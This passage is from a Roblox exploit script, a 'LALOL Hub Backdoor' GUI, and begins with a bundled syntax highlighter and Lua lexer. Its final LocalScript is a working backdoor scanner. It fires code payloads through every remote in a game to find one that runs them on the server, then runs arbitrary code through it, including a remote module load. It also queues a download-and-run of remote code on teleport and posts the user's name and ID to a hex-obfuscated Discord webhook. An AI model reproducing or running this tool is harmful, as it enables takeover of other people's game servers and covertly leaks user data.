							table.clear(connections)
							connections = nil
						end
						Cleanups[textObject] = newCleanup
						cleanup = newCleanup

						table.insert(
							connections,
							textObject.AncestryChanged:Connect(function()
								if textObject.Parent then
									return
								end

								cleanup()
							end)
						)
						table.insert(
							connections,
							textObject:GetPropertyChangedSignal("TextBounds"):Connect(function()
								Highlighter.highlight({
									textObject = textObject,
									forceUpdate = true,
									lexer = lexer,
									customLang = customLang,
								})
							end)
						)
						table.insert(
							connections,
							textObject:GetPropertyChangedSignal("Text"):Connect(function()
								Highlighter.highlight({
									textObject = textObject,
									lexer = lexer,
									customLang = customLang,
								})
							end)
						)
						table.insert(
							connections,
							textObject:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
								Highlighter.highlight({
									textObject = textObject,
									forceUpdate = true,
									lexer = lexer,
									customLang = customLang,
								})
							end)
						)
					end

					-- Shortcut empty labels
					if src == "" then
						for l=1, #lineLabels do
							if lineLabels[l].Text == "" then continue end
							lineLabels[l].Text = ""
						end
						return cleanup
					end

					-- Wait for TextBounds to be non-NaN and non-zero because Roblox
					local textBounds = textObject.TextBounds
					while (textBounds.Y ~= textBounds.Y) or (textBounds.Y < 1) do
						task.wait()
						textBounds = textObject.TextBounds
					end

					if LastData[textObject] == nil then
						-- Got cleaned up while we were waiting
						return cleanup
					end

					local numLines = #lines
					local textHeight = textBounds.Y / numLines * textObject.LineHeight

					local richText, index, lineNumber = table.create(5), 0, 1
					for token: string, content: string in lexer.scan(src) do
						local Color =
							if customLang and customLang[content] then
							TokenColors["custom"]
							else
							TokenColors[token] or TokenColors["iden"]

						local tokenLines = string.split(SanitizeRichText(content), "\n")

						for l, line in ipairs(tokenLines) do
							-- Find line label
							local lineLabel = lineLabels[lineNumber]
							if not lineLabel then
								local newLabel = Instance.new("TextLabel")
								newLabel.Name = "Line_" .. lineNumber
								newLabel.RichText = true
								newLabel.BackgroundTransparency = 1
								newLabel.Text = ""
								newLabel.TextXAlignment = Enum.TextXAlignment.Left
								newLabel.TextYAlignment = Enum.TextYAlignment.Top
								newLabel.Parent = lineFolder
								newLabel.TextWrapped=true
								lineLabels[lineNumber] = newLabel
								lineLabel = newLabel
							end

							-- Align line label
							lineLabel.TextColor3 = TokenColors["iden"]
							lineLabel.Font = textObject.Font
							lineLabel.TextSize = textObject.TextSize
							lineLabel.Size = UDim2.new(1, 0, 0, math.ceil(textHeight))
							lineLabel.Position = UDim2.fromScale(0, textHeight * (lineNumber - 1) / textObject.AbsoluteSize.Y)

							-- If multiline token, then set line & move to next
							if l > 1 then
								if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
									-- Set line
									lineLabels[lineNumber].Text = table.concat(richText)
								end
								-- Move to next line
								lineNumber += 1
								index = 0
								table.clear(richText)
							end

							-- If changed, add token to line
							if forceUpdate or lines[lineNumber] ~= previousLines[lineNumber] then
								index += 1
								-- Only add RichText tags when the color is non-default and the characters are non-whitespace
								if Color ~= TokenColors["iden"] and string.find(line, "[%S%C]") then
									richText[index] = string.format(ColorFormatter[Color], line)
								else
									richText[index] = line
								end
							end
						end
					end

					-- Set final line
					if richText[1] and lineLabels[lineNumber] then
						lineLabels[lineNumber].Text = table.concat(richText)
					end

					-- Clear unused line labels
					for l=lineNumber+1, #lineLabels do
						if lineLabels[l].Text == "" then continue end
						lineLabels[l].Text = ""
					end

					return cleanup
				end

				function Highlighter.refresh(): ()
					-- Rehighlight existing labels using latest colors
					for textObject, data in pairs(LastData) do
						for _, lineLabel in ipairs(data.Labels) do
							lineLabel.TextColor3 = TokenColors["iden"]
						end

						Highlighter.highlight({
							textObject = textObject,
							forceUpdate = true,
							src = data.Text,
							lexer = data.Lexer,
							customLang = data.CustomLang,
						})
					end
				end

				function Highlighter.setTokenColors(colors: HighlighterColors)
					for token, color in colors do
						TokenColors[token] = color
						ColorFormatter[color] = string.format(
							'<font color="#%.2x%.2x%.2x">',
							color.R * 255,
							color.G * 255,
							color.B * 255
						) .. "%s</font>"
					end

					Highlighter.refresh()
				end
				Highlighter.setTokenColors(TokenColors)

				return Highlighter :: Highlighter

			end;
		};
		G2L_MODULES[G2L["14"]] = {
			Closure = function()
				local script = G2L["14"];
--[=[
	Lexical scanner for creating a sequence of tokens from Lua source code.
	This is a heavily modified and Roblox-optimized version of
	the original Penlight Lexer module:
		https://github.com/stevedonovan/Penlight
	Authors:
		stevedonovan <https://github.com/stevedonovan> ----------- Original Penlight lexer author
		ryanjmulder <https://github.com/ryanjmulder> ------------- Penlight lexer contributer
		mpeterv <https://github.com/mpeterv> --------------------- Penlight lexer contributer
		Tieske <https://github.com/Tieske> ----------------------- Penlight lexer contributer
		boatbomber <https://github.com/boatbomber> --------------- Roblox port, added builtin token,
		                                                           added patterns for incomplete syntax, bug fixes,
		                                                           behavior changes, token optimization, thread optimization
		                                                           Added lexer.navigator() for non-sequential reads
		Sleitnick <https://github.com/Sleitnick> ----------------- Roblox optimizations
		howmanysmall <https://github.com/howmanysmall> ----------- Lua + Roblox optimizations

	List of possible tokens:
		- iden
		- keyword
		- builtin
		- string
		- number
		- comment
		- operator
--]=]

				local lexer = {}

				local Prefix, Suffix, Cleaner = "^[%c%s]*", "[%c%s]*", "[%c%s]+"
				local UNICODE = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+"
				local NUMBER_A = "0[xX][%da-fA-F_]+"
				local NUMBER_B = "0[bB][01_]+"
				local NUMBER_C = "%d+%.?%d*[eE][%+%-]?%d+"
				local NUMBER_D = "%d+[%._]?[%d_eE]*"
				local OPERATORS = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+"
				local BRACKETS = "[%[%]]+" -- needs to be separate pattern from other operators or it'll mess up multiline strings
				local IDEN = "[%a_][%w_]*"
				local STRING_EMPTY = "(['\"])%1" --Empty String
				local STRING_PLAIN = "(['\"])[^\n]-([^\\]%1)" --TODO: Handle escaping escapes
				local STRING_INTER = "`[^\n]-`"
				local STRING_INCOMP_A = "(['\"]).-\n" --Incompleted String with next line
				local STRING_INCOMP_B = "(['\"])[^\n]*" --Incompleted String without next line
				local STRING_MULTI = "%[(=*)%[.-%]%1%]" --Multiline-String
				local STRING_MULTI_INCOMP = "%[=*%[.-.*" --Incompleted Multiline-String
				local COMMENT_MULTI = "%-%-%[(=*)%[.-%]%1%]" --Completed Multiline-Comment
				local COMMENT_MULTI_INCOMP = "%-%-%[=*%[.-.*" --Incompleted Multiline-Comment
				local COMMENT_PLAIN = "%-%-.-\n" --Completed Singleline-Comment
				local COMMENT_INCOMP = "%-%-.*" --Incompleted Singleline-Comment
				-- local TYPED_VAR = ":%s*([%w%?%| \t]+%s*)" --Typed variable, parameter, function

				local lang = require(script.language)
				local lua_keyword = lang.keyword
				local lua_builtin = lang.builtin
				local lua_libraries = lang.libraries

				lexer.language = lang

				local lua_matches = {
					-- Indentifiers
					{ Prefix .. IDEN .. Suffix, "var" },

					-- Numbers
					{ Prefix .. NUMBER_A .. Suffix, "number" },
					{ Prefix .. NUMBER_B .. Suffix, "number" },
					{ Prefix .. NUMBER_C .. Suffix, "number" },
					{ Prefix .. NUMBER_D .. Suffix, "number" },

					-- Strings
					{ Prefix .. STRING_EMPTY .. Suffix, "string" },
					{ Prefix .. STRING_PLAIN .. Suffix, "string" },
					{ Prefix .. STRING_INCOMP_A .. Suffix, "string" },
					{ Prefix .. STRING_INCOMP_B .. Suffix, "string" },
					{ Prefix .. STRING_MULTI .. Suffix, "string" },
					{ Prefix .. STRING_MULTI_INCOMP .. Suffix, "string" },
					{ Prefix .. STRING_INTER .. Suffix, "string_inter" },

					-- Comments
					{ Prefix .. COMMENT_MULTI .. Suffix, "comment" },
					{ Prefix .. COMMENT_MULTI_INCOMP .. Suffix, "comment" },
					{ Prefix .. COMMENT_PLAIN .. Suffix, "comment" },
					{ Prefix .. COMMENT_INCOMP .. Suffix, "comment" },

					-- Operators
					{ Prefix .. OPERATORS .. Suffix, "operator" },
					{ Prefix .. BRACKETS .. Suffix, "operator" },

					-- Unicode
					{ Prefix .. UNICODE .. Suffix, "iden" },

					-- Unknown
					{ "^.", "iden" },
				}

				-- To reduce the amount of table indexing during lexing, we separate the matches now
				local PATTERNS, TOKENS = {}, {}
				for i, m in lua_matches do
					PATTERNS[i] = m[1]
					TOKENS[i] = m[2]
				end

				--- Create a plain token iterator from a string.
				-- @tparam string s a string.

				function lexer.scan(s: string)
					local index = 1
					local size = #s
					local previousContent1, previousContent2, previousContent3, previousToken = "", "", "", ""

					local thread = coroutine.create(function()
						while index <= size do
							local matched = false
							for tokenType, pattern in ipairs(PATTERNS) do
								-- Find match
								local start, finish = string.find(s, pattern, index)
								if start == nil then continue end

								-- Move head
								index = finish + 1
								matched = true

								-- Gather results
								local content = string.sub(s, start, finish)
								local rawToken = TOKENS[tokenType]
								local processedToken = rawToken

								-- Process token
								if rawToken == "var" then
									-- Since we merge spaces into the tok, we need to remove them
									-- in order to check the actual word it contains
									local cleanContent = string.gsub(content, Cleaner, "")

									if lua_keyword[cleanContent] then
										processedToken = "keyword"
									elseif lua_builtin[cleanContent] then
										processedToken = "builtin"
									elseif string.find(previousContent1, "%.[%s%c]*$") and previousToken ~= "comment" then
										-- The previous was a . so we need to special case indexing things
										local parent = string.gsub(previousContent2, Cleaner, "")
										local lib = lua_libraries[parent]
										if lib and lib[cleanContent] and not string.find(previousContent3, "%.[%s%c]*$") then
											-- Indexing a builtin lib with existing item, treat as a builtin
											processedToken = "builtin"
										else
											-- Indexing a non builtin, can't be treated as a keyword/builtin
											processedToken = "iden"
										end
										-- print("indexing",parent,"with",cleanTok,"as",t2)
									else
										processedToken = "iden"
									end
								elseif rawToken == "string_inter" then
									if not string.find(content, "[^\\]{") then
										-- This inter string doesnt actually have any inters
										processedToken = "string"
									else
										-- We're gonna do our own yields, so the main loop won't need to
										-- Our yields will be a mix of string and whatever is inside the inters
										processedToken = nil

										local isString = true
										local subIndex = 1
										local subSize = #content
										while subIndex <= subSize do
											-- Find next brace
											local subStart, subFinish = string.find(content, "^.-[^\\][{}]", subIndex)
											if subStart == nil then
												-- No more braces, all string
												coroutine.yield("string", string.sub(content, subIndex))
												break
											end

											if isString then
												-- We are currently a string
												subIndex = subFinish + 1
												coroutine.yield("string", string.sub(content, subStart, subFinish))

												-- This brace opens code
												isString = false
											else
												-- We are currently in code
												subIndex = subFinish
												local subContent = string.sub(content, subStart, subFinish-1)
												for innerToken, innerContent in lexer.scan(subContent) do
													coroutine.yield(innerToken, innerContent)
												end

												-- This brace opens string/closes code
												isString = true
											end
										end
									end
								end

								-- Record last 3 tokens for the indexing context check
								previousContent3 = previousContent2
								previousContent2 = previousContent1
								previousContent1 = content
								previousToken = processedToken or rawToken
								if processedToken then
									coroutine.yield(processedToken, content)
								end
								break
							end

							-- No matches found
							if not matched then
								return
							end
						end

						-- Completed the scan
						return
					end)

					return function()
						if coroutine.status(thread) == "dead" then
							return
						end

						local success, token, content = coroutine.resume(thread)
						if success and token then
							return token, content
						end

						return
					end
				end

				function lexer.navigator()
					local nav = {
						Source = "",
						TokenCache = table.create(50),

						_RealIndex = 0,
						_UserIndex = 0,
						_ScanThread = nil,
					}

					function nav:Destroy()
						self.Source = nil
						self._RealIndex = nil
						self._UserIndex = nil
						self.TokenCache = nil
						self._ScanThread = nil
					end

					function nav:SetSource(SourceString)
						self.Source = SourceString

						self._RealIndex = 0
						self._UserIndex = 0
						table.clear(self.TokenCache)

						self._ScanThread = coroutine.create(function()
							for Token, Src in lexer.scan(self.Source) do
								self._RealIndex += 1
								self.TokenCache[self._RealIndex] = { Token, Src }
								coroutine.yield(Token, Src)
							end
						end)
					end

					function nav.Next()
						nav._UserIndex += 1

						if nav._RealIndex >= nav._UserIndex then
							-- Already scanned, return cached
							return table.unpack(nav.TokenCache[nav._UserIndex])
						else
							if coroutine.status(nav._ScanThread) == "dead" then
								-- Scan thread dead
								return
							else
								local success, token, src = coroutine.resume(nav._ScanThread)
								if success and token then
									-- Scanned new data
									return token, src
								else
									-- Lex completed
									return
								end
							end
						end
					end

					function nav.Peek(PeekAmount)
						local GoalIndex = nav._UserIndex + PeekAmount

						if nav._RealIndex >= GoalIndex then
							-- Already scanned, return cached
							if GoalIndex > 0 then
								return table.unpack(nav.TokenCache[GoalIndex])
							else
								-- Invalid peek
								return
							end
						else
							if coroutine.status(nav._ScanThread) == "dead" then
								-- Scan thread dead
								return
							else
								local IterationsAway = GoalIndex - nav._RealIndex

								local success, token, src = nil, nil, nil

								for _ = 1, IterationsAway do
									success, token, src = coroutine.resume(nav._ScanThread)
									if not (success or token) then
										-- Lex completed
										break
									end
								end

								return token, src
							end
						end
					end

					return nav
				end

				return lexer

			end;
		};
		G2L_MODULES[G2L["15"]] = {
			Closure = function()
				local script = G2L["15"];
				local language = {
					keyword = {
						["and"] = "keyword",
						["break"] = "keyword",
						["continue"] = "keyword",
						["do"] = "keyword",
						["else"] = "keyword",
						["elseif"] = "keyword",
						["end"] = "keyword",
						["export"] = "keyword",
						["false"] = "keyword",
						["for"] = "keyword",
						["function"] = "keyword",
						["if"] = "keyword",
						["in"] = "keyword",
						["local"] = "keyword",
						["nil"] = "keyword",
						["not"] = "keyword",
						["or"] = "keyword",
						["repeat"] = "keyword",
						["return"] = "keyword",
						["self"] = "keyword",
						["then"] = "keyword",
						["true"] = "keyword",
						["type"] = "keyword",
						["typeof"] = "keyword",
						["until"] = "keyword",
						["while"] = "keyword",
					},

					builtin = {
						-- Luau Functions
						["assert"] = "function",
						["error"] = "function",
						["getfenv"] = "function",
						["getmetatable"] = "function",
						["ipairs"] = "function",
						["loadstring"] = "function",
						["newproxy"] = "function",
						["next"] = "function",
						["pairs"] = "function",
						["pcall"] = "function",
						["print"] = "function",
						["rawequal"] = "function",
						["rawget"] = "function",
						["rawlen"] = "function",
						["rawset"] = "function",
						["select"] = "function",
						["setfenv"] = "function",
						["setmetatable"] = "function",
						["tonumber"] = "function",
						["tostring"] = "function",
						["unpack"] = "function",
						["xpcall"] = "function",

						-- Luau Functions (Deprecated)
						["collectgarbage"] = "function",

						-- Luau Variables
						["_G"] = "table",
						["_VERSION"] = "string",

						-- Luau Tables
						["bit32"] = "table",
						["coroutine"] = "table",
						["debug"] = "table",
						["math"] = "table",
						["os"] = "table",
						["string"] = "table",
						["table"] = "table",
						["utf8"] = "table",

						-- Roblox Functions
						["DebuggerManager"] = "function",
						["delay"] = "function",
						["gcinfo"] = "function",
						["PluginManager"] = "function",
						["require"] = "function",
						["settings"] = "function",
						["spawn"] = "function",
						["tick"] = "function",
						["time"] = "function",
						["UserSettings"] = "function",
						["wait"] = "function",
						["warn"] = "function",

						-- Roblox Functions (Deprecated)
						["Delay"] = "function",
						["ElapsedTime"] = "function",
						["elapsedTime"] = "function",
						["printidentity"] = "function",
						["Spawn"] = "function",
						["Stats"] = "function",
						["stats"] = "function",
						["Version"] = "function",
						["version"] = "function",
						["Wait"] = "function",
						["ypcall"] = "function",

						-- Roblox Variables
						["game"] = "Instance",
						["plugin"] = "Instance",
						["script"] = "Instance",
						["shared"] = "Instance",
						["workspace"] = "Instance",

						-- Roblox Variables (Deprecated)
						["Game"] = "Instance",
						["Workspace"] = "Instance",

						-- Roblox Tables
						["Axes"] = "table",
						["BrickColor"] = "table",
						["CatalogSearchParams"] = "table",
						["CFrame"] = "table",
						["Color3"] = "table",
						["ColorSequence"] = "table",
						["ColorSequenceKeypoint"] = "table",
						["DateTime"] = "table",
						["DockWidgetPluginGuiInfo"] = "table",
						["Enum"] = "table",
						["Faces"] = "table",
						["FloatCurveKey"] = "table",
						["Font"] = "table",
						["Instance"] = "table",
						["NumberRange"] = "table",
						["NumberSequence"] = "table",
						["NumberSequenceKeypoint"] = "table",
						["OverlapParams"] = "table",
						["PathWaypoint"] = "table",
						["PhysicalProperties"] = "table",
						["Random"] = "table",
						["Ray"] = "table",
						["RaycastParams"] = "table",
						["Rect"] = "table",
						["Region3"] = "table",
						["Region3int16"] = "table",
						["RotationCurveKey"] = "table",
						["task"] = "table",
						["TweenInfo"] = "table",
						["UDim"] = "table",
						["UDim2"] = "table",
						["Vector2"] = "table",
						["Vector2int16"] = "table",
						["Vector3"] = "table",
						["Vector3int16"] = "table",
					},

					libraries = {

						-- Luau Libraries
						bit32 = {
							arshift = "function",
							band = "function",
							bnot = "function",
							bor = "function",
							btest = "function",
							bxor = "function",
							countlz = "function",
							countrz = "function",
							extract = "function",
							lrotate = "function",
							lshift = "function",
							replace = "function",
							rrotate = "function",
							rshift = "function",
						},

						coroutine = {
							close = "function",
							create = "function",
							isyieldable = "function",
							resume = "function",
							running = "function",
							status = "function",
							wrap = "function",
							yield = "function",
						},

						debug = {
							dumpheap = "function",
							info = "function",
							loadmodule = "function",
							profilebegin = "function",
							profileend = "function",
							resetmemorycategory = "function",
							setmemorycategory = "function",
							traceback = "function",
						},

						math = {
							abs = "function",
							acos = "function",
							asin = "function",
							atan2 = "function",
							atan = "function",
							ceil = "function",
							clamp = "function",
							cos = "function",
							cosh = "function",
							deg = "function",
							exp = "function",
							floor = "function",
							fmod = "function",
							frexp = "function",
							ldexp = "function",
							log10 = "function",
							log = "function",
							max = "function",
							min = "function",
							modf = "function",
							noise = "function",
							pow = "function",
							rad = "function",
							random = "function",
							randomseed = "function",
							round = "function",
							sign = "function",
							sin = "function",
							sinh = "function",
							sqrt = "function",
							tan = "function",
							tanh = "function",

							huge = "number",
							pi = "number",
						},

						os = {
							clock = "function",
							date = "function",
							difftime = "function",
							time = "function",
						},

						string = {
							byte = "function",
							char = "function",
							find = "function",
							format = "function",
							gmatch = "function",
							gsub = "function",
							len = "function",
							lower = "function",
							match = "function",
							pack = "function",
							packsize = "function",
							rep = "function",
							reverse = "function",
							split = "function",
							sub = "function",
							unpack = "function",
							upper = "function",
						},

						table = {
							clear = "function",
							clone = "function",
							concat = "function",
							create = "function",
							find = "function",
							foreach = "function",
							foreachi = "function",
							freeze = "function",
							getn = "function",
							insert = "function",
							isfrozen = "function",
							maxn = "function",
							move = "function",
							pack = "function",
							remove = "function",
							sort = "function",
							unpack = "function",
						},

						utf8 = {
							char = "function",
							codepoint = "function",
							codes = "function",
							graphemes = "function",
							len = "function",
							nfcnormalize = "function",
							nfdnormalize = "function",
							offset = "function",

							charpattern = "string",
						},

						-- Roblox Libraries
						Axes = {
							new = "function",
						},

						BrickColor = {
							Black = "function",
							Blue = "function",
							DarkGray = "function",
							Gray = "function",
							Green = "function",
							new = "function",
							New = "function",
							palette = "function",
							Random = "function",
							random = "function",
							Red = "function",
							White = "function",
							Yellow = "function",
						},

						CatalogSearchParams = {
							new = "function",
						},

						CFrame = {
							Angles = "function",
							fromAxisAngle = "function",
							fromEulerAngles = "function",
							fromEulerAnglesXYZ = "function",
							fromEulerAnglesYXZ = "function",
							fromMatrix = "function",
							fromOrientation = "function",
							lookAt = "function",
							new = "function",

							identity = "CFrame",
						},

						Color3 = {
							fromHex = "function",
							fromHSV = "function",
							fromRGB = "function",
							new = "function",
							toHSV = "function",
						},

						ColorSequence = {
							new = "function",
						},

						ColorSequenceKeypoint = {
							new = "function",
						},

						DateTime = {
							fromIsoDate = "function",
							fromLocalTime = "function",
							fromUniversalTime = "function",
							fromUnixTimestamp = "function",
							fromUnixTimestampMillis = "function",
							now = "function",
						},

						DockWidgetPluginGuiInfo = {
							new = "function",
						},

						Enum = {},

						Faces = {
							new = "function",
						},

						FloatCurveKey = {
							new = "function",
						},

						Font = {
							fromEnum = "function",
							fromId = "function",
							fromName = "function",
							new = "function",
						},

						Instance = {
							new = "function",
						},

						NumberRange = {
							new = "function",
						},

						NumberSequence = {
							new = "function",
						},

						NumberSequenceKeypoint = {
							new = "function",
						},

						OverlapParams = {
							new = "function",
						},

						PathWaypoint = {
							new = "function",
						},

						PhysicalProperties = {
							new = "function",
						},

						Random = {
							new = "function",
						},

						Ray = {
							new = "function",
						},

						RaycastParams = {
							new = "function",
						},

						Rect = {
							new = "function",
						},

						Region3 = {
							new = "function",
						},

						Region3int16 = {
							new = "function",
						},

						RotationCurveKey = {
							new = "function",
						},

						task = {
							cancel = "function",
							defer = "function",
							delay = "function",
							desynchronize = "function",
							spawn = "function",
							synchronize = "function",
							wait = "function",
						},

						TweenInfo = {
							new = "function",
						},

						UDim = {
							new = "function",
						},

						UDim2 = {
							fromOffset = "function",
							fromScale = "function",
							new = "function",
						},

						Vector2 = {
							new = "function",

							one = "Vector2",
							xAxis = "Vector2",
							yAxis = "Vector2",
							zero = "Vector2",
						},

						Vector2int16 = {
							new = "function",
						},

						Vector3 = {
							fromAxis = "function",
							FromAxis = "function",
							fromNormalId = "function",
							FromNormalId = "function",
							new = "function",

							one = "Vector3",
							xAxis = "Vector3",
							yAxis = "Vector3",
							zAxis = "Vector3",
							zero = "Vector3",
						},

						Vector3int16 = {
							new = "function",
						},
					},
				}

				-- Filling up language.libraries.Enum table
				local enumLibraryTable = language.libraries.Enum

				for _, enum in ipairs(Enum:GetEnums()) do
					--TODO: Remove tostring from here once there is a better way to get the name of an Enum
					enumLibraryTable[tostring(enum)] = "Enum"
				end

				return language

			end;
		};
		-- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
		local function C_12()
			local script = G2L["12"];
			local Highlighter = require(script.Highlighter)

			Highlighter.highlight({
				-- The object to syntax highlight
				textObject=script.Parent,
				-- The source text for highlighting- defaults to textObject.Text
				--	src: string?,
				-- Update even if there are no changes since last highlight
				--	forceUpdate=true,
				-- Lexer for tokenizing src, defaults to the bundled Lua lexer
				--	lexer=true,
			})

			textbox=script.Parent
			textbox.InputChanged:Connect(function()
				if textbox.Text~='' then
					textbox.TextTransparency=1
					return
				end
				textbox.TextTransparency=0
			end)
		end;
		task.spawn(C_12);
		-- StarterGui.LALOL Hub Backdoor.LocalScript
		local function C_20()
			local script = G2L["20"];
			queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
			if queueteleport then
				queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
			end

			GUI=script.Parent.Frame

			alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

			backdoor=nil
			HttpService=game:GetService("HttpService")

			function debug(text, lvl)
				local func=print
				if lvl==1 then func=print end
				if lvl==2 then func=error end
				if lvl==3 then func=warn end
				func('Project SMEGMA: '..text)
			end

			function runRemote(remote, data, data2)

				if remote:IsA('RemoteEvent') then
					remote:FireServer(data)
				elseif remote:IsA('RemoteFunction') then
					spawn(function() remote:InvokeServer(data) end)
				end

			end

			function makeVisible(folder, state)
				for i,v in folder:GetDescendants() do
					if v:IsA('Frame') then 
						v.Visible=state
					end
				end
			end

			function notify(text)
				game:GetService('StarterGui'):SetCore(
					"SendNotification",
					{
						Title = "Project Smegma",
						Duration = 6,
						Text = text
					}
				)
			end


			if _G.LALOL_Hub_Backdoor_Logs_Disabled then
				notify('Logs disabled :(')
			end

			makeVisible(GUI, false)
			GUI.Scanner.Visible=true
			GUI.Visible=true

			function generateName(lenght)

				local text=''

				for i=1,lenght do
					text=text..alphabet[math.random(1,#alphabet)]
				end

				return text

			end

			local code
			function findRemote()

				local timee=os.clock()

				local remotes={}

				local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
				if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
					while true do
						code=generateName(math.random(12,30))
						if not remotes[code] then break end
					end
					spawn(function() protected_backdoor:InvokeServer('Project Smegma', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
					remotes[code]=protected_backdoor
				end

				for i,remote in game:GetDescendants() do

					-- Validation Checker

					if not remote:IsA('RemoteEvent') then 
						if not remote:IsA('RemoteFunction') then continue end
					end

					-- RobloxReplicatedStorage
					if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
						debug('Roblox Replicated Storage ('..remote.Name..')', 1)
						continue
					end

					if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then

						-- ADONIS Anti-Exploit
						if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
							debug('Adonis filter detected ('..remote.Name..')', 1)
							continue
						end

						-- HD Admin
						if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
							debug('HD Admin ('..remote.Name..')', 1)
							continue
						end

						-- Chat Events
						if remote.Parent.Name=='DefaultChatSystemChatEvents' then
							debug('Chat event ('..remote.Name..')', 1)
							continue
						end

					end

					-- Backdoor Sender

					while true do
						code=generateName(math.random(12,30))
						if not remotes[code] then break end
					end

					runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
					remotes[code]=remote

					debug('Sended Backdoor "'..remote:GetFullName()..'"', 1)

				end

				-- Backdoor Checker

				for i=1,100 do

					for i,remote in remotes do
						local code=i

						if workspace:FindFirstChild(code) then

							notify('Backdoor found! '..os.clock()-timee..'s')

							backdoor=remote
							debug(remote:GetFullName(), 3)
							GUI.Scanner.Visible=false
							makeVisible(GUI.Executor, true)

							--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
							runRemote(remote, "require(171016405.1884*69)")			
							runRemote(remote, "a=Instance.new('Hint')a.Text='ProjectSmegma'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")

							local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
							if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
								request({
									Url = '\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\49\48\56\54\57\52\49\54\48\52\54\52\49\53\56\55\56\49\47\57\86\67\122\95\99\107\52\117\120\51\77\51\84\81\106\56\109\111\76\68\113\51\78\119\45\100\107\89\68\87\55\103\69\99\97\76\72\75\80\98\101\50\95\74\74\73\122\53\109\50\102\69\104\54\101\83\110\112\51\51\87\79\76\116\103\105\49',
									Method = 'POST',
									Headers = {
										['Content-Type'] = 'application/json',
									},
									Body = HttpService:JSONEncode({
										username='pls dont delete this w3bh00k',
										content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
									})
								})
							end

							return true
						end
						--				debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
					end

					wait()--.1)

				end

				return false

			end

			GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
				local a,b=string.gsub(GUI.Executor.ExecutorBox.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)

				local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
				if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
					debug('Protected backdoor found', 3)
					spawn(function()
						local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('Project Smegma', a) end)
						if variantValue~=nil then
							local splited=string.split(variantValue,':')
							notify(splited[#splited])
						end
					end)
				else
					runRemote(backdoor, a)
				end
				GUI.Executor.Execute.Button.Text='Executed!'
				wait(0.5)
				GUI.Executor.Execute.Button.Text='Execute'
			end)
			GUI.Executor.Clear.Button.MouseButton1Click:Connect(function()
				GUI.Executor.ExecutorBox.TextBox.Text=''
				GUI.Executor.Clear.Button.Text='Cleared!'
				wait(0.5)
				GUI.Executor.Clear.Button.Text='Clear'
			end)

			searching=false

			GUI.Scanner.Button.MouseButton1Click:Connect(function()
				if not searching then
					searching=true
					debug('Scanning...', 3)
					GUI.Scanner.Button.Text='Scanning...'
					if not findRemote() then
						GUI.Scanner.Button.Text='No backdoor :('
						searching=false
					end
				end
			end)

			game:GetService('UserInputService').InputBegan:Connect(function(input, processed)
				if (input.KeyCode == Enum.KeyCode.LeftAlt and not processed) then
					if GUI.Visible then GUI.Visible=false
					else GUI.Visible=true end
				end
			end)
		end;
		task.spawn(C_20);
		-- StarterGui.LALOL Hub Backdoor.Dragify
		local function C_21()
			local script = G2L["21"];
			local UIS = game:GetService("UserInputService")
			function dragify(Frame)
				dragToggle = nil
				local dragSpeed = 0.33
				dragInput = nil
				dragStart = nil
				local dragPos = nil
				function updateInput(input)
					local Delta = input.Position - dragStart
					local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
					game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.15), {Position = Position}):Play()
				end
				Frame.InputBegan:Connect(function(input)
					if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
						dragToggle = true
						dragStart = input.Position
						startPos = Frame.Position
						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								dragToggle = false
							end
						end)
					end
				end)
				Frame.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						dragInput = input
					end
				end)
				game:GetService("UserInputService").InputChanged:Connect(function(input)
					if input == dragInput and dragToggle then
						updateInput(input)
					end
				end)
			end

			dragify(script.Parent.Frame)
		end;
		task.spawn(C_21);

